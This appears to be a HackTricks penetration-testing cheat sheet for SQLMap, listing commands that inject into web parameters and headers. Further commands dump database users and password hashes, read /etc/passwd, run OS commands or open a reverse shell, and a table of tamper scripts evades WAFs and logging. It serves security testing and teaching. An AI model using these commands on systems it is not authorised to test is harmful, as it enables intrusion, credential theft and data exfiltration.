# SQLMap - Cheetsheat

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con más de una década que se celebrará el 7 y 8 de septiembre de 2023 en Bogotá, Colombia. Es un evento de gran contenido técnico donde se presentan las últimas investigaciones en español que atrae a hackers e investigadores de todo el mundo.\
¡Regístrate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org/" %}

## Basic arguments for SQLmap

### Generic

```bash
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```

### Retrieve Information

#### Internal

```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```

#### DB data

```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```

## Injection place

### From Burp/ZAP capture

Capture the request and create a req.txt file

```bash
sqlmap -r req.txt --current-user
```

### GET Request Injection

```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```

### POST Request Injection

```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```

### Injections in Headers and other HTTP Methods

```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```

### Indicate string when injection is successful

```bash
--string="string_showed_when_TRUE" 
```

### Eval

**Sqlmap** allows the use of `-e` or `--eval` to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload before sending it. In the following example the **flask cookie session** **is signed by flask with the known secret before sending it**:

```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```

### Shell

```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```

### Read File

```bash
--file-read=/etc/passwd
```

### Crawl a website with SQLmap and auto-exploit

```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

### Second Order Injection

```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

[**Read this post** ](second-order-injection-sqlmap.md)**about how to perform simple and complex second order injections with sqlmap.**

## Labs to practice

* Learn about sqlmap by using it in the **THM room**:

{% embed url="https://tryhackme.com/room/sqlmap" %}

## Customizing Injection

### Set a suffix

```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### Prefix

```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```

### Help finding boolean injection

```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```

### Tamper

Remember that **you can create your own tamper in python** and it's very simple. You can find a tamper example in the [Second Order Injection page here](second-order-injection-sqlmap.md).

```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```

| Tamper                       | Description                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Replaces apostrophe character with its UTF-8 full width counterpart                                                                |
| apostrophenullencode.py      | Replaces apostrophe character with its illegal double unicode counterpart                                                          |
| appendnullbyte.py            | Appends encoded NULL byte character at the end of payload                                                                          |
| base64encode.py              | Base64 all characters in a given payload                                                                                           |
| between.py                   | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
| chardoubleencode.py          | Double url-encodes all characters in a given payload (not processing already encoded)                                              |
| commalesslimit.py            | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Replaces instances like 'CONCAT(A, B)' with 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                 |
| charencode.py                | Url-encodes all characters in a given payload (not processing already encoded)                                                     |
| charunicodeencode.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "%u0022"                           |
| charunicodeescape.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "\u0022"                           |
| equaltolike.py               | Replaces all occurances of operator equal ('=') with operator 'LIKE'                                                               |
| escapequotes.py              | Slash escape quotes (' and ")                                                                                                      |
| greatest.py                  | Replaces greater than operator ('>') with 'GREATEST' counterpart                                                                   |
| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword                                                                                   |
| ifnull2ifisnull.py           | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Embraces complete query with versioned comment                                                                                     |
| modsecurityzeroversioned.py  | Embraces complete query with zero-versioned comment                                                                                |
| multiplespaces.py            | Adds multiple spaces around SQL keywords                                                                                           |
| nonrecursivereplacement.py   | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters               |
| percentage.py                | Adds a percentage sign ('%') infront of each character                                                                             |
| overlongutf8.py              | Converts all characters in a given payload (not processing already encoded)                                                        |
| randomcase.py                | Replaces each keyword character with random case value                                                                             |
| randomcomments.py            | Add random comments to SQL keywords                                                                                                |
| securesphere.py              | Appends special crafted string                                                                                                     |
| sp\_password.py              | Appends 'sp\_password' to the end of the payload for automatic obfuscation from DBMS logs                                          |
| space2comment.py             | Replaces space character (' ') with comments                                                                                       |
| space2dash.py                | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')                        |
| space2hash.py                | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                      |
| space2morehash.py            | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                      |
| space2mssqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| space2mssqlhash.py           | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')                                          |
| space2mysqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| space2mysqldash.py           | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')                                            |
| space2plus.py                | Replaces space character (' ') with plus ('+')                                                                                     |
| space2randomblank.py         | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| symboliclogical.py           | Replaces AND and OR logical operators with their symbolic counterparts (&& and                                                     |
| unionalltounion.py           | Replaces UNION ALL SELECT with UNION SELECT                                                                                        |
| unmagicquotes.py             | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)             |
| uppercase.py                 | Replaces each keyword character with upper case value 'INSERT'                                                                     |
| varnish.py                   | Append a HTTP header 'X-originating-IP'                                                                                            |
| versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment                                                                    |
| versionedmorekeywords.py     | Encloses each keyword with versioned MySQL comment                                                                                 |
| xforwardedfor.py             | Append a fake HTTP header 'X-Forwarded-For'                                                                                        |

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con más de una década que se celebrará el 7 y 8 de septiembre de 2023 en Bogotá, Colombia. Es un evento de gran contenido técnico donde se presentan las últimas investigaciones en español que atrae a hackers e investigadores de todo el mundo.\
¡Regístrate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
